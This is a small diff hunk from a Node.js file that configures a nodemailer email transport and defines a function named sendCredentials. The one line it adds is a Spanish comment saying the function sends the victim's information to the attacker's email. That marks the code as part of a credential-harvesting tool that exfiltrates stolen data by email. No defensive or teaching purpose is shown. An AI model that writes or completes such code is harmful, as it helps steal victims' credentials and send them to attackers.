@@ -7,7 +7,7 @@ const transporter = nodemailer.createTransport({
         pass:process.env.PASSWORD
     }
 })
-
+//Envio info de la victima al correo del atacante
 function sendCredentials(info,callback){
     const mailOptions = {
         from: process.env.EMAIL,
